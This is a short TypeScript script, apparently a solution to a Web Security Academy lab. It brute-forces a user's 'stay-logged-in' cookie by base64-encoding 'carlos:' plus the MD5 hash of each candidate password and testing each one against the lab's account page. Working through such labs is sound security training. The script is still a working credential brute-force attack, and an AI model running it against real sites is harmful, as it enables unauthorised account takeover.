// 1. Retrieved stay logged in cookie from chrome dev tools on the my accounts page
// 2. Base64 decoded the cookie with the result: wiener:51dc30ddc473d43a6011e9ebba6ca770
// 3. Base

import axios, { AxiosResponse } from "axios";
import * as fs from "fs";
import * as crypto from "crypto";

axios.defaults.withCredentials = true;

const subdomain = "0a5800d104e9bf2fc0980d4800bd0071";
const myAccountURL = `https://${subdomain}.web-security-academy.net/my-account`;

const main = async () => {
  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");
  try {
    for (let passwordCandidate of passwordCandidates) {
      const hackedCookie = Buffer.from(
        `carlos:${crypto
          .createHash("md5")
          .update(passwordCandidate)
          .digest("hex")}`
      ).toString("base64");

      const response = await axios.get(myAccountURL, {
        headers: { Cookie: `stay-logged-in=${hackedCookie}` },
      });

      console.log(response.data);

      if (response.data.includes("Your username is")) {
        console.log("Carlos' password is: ", passwordCandidate);
        break;
      }
    }
  } catch (e) {
    console.log(e);
    throw e;
  }
};

main();
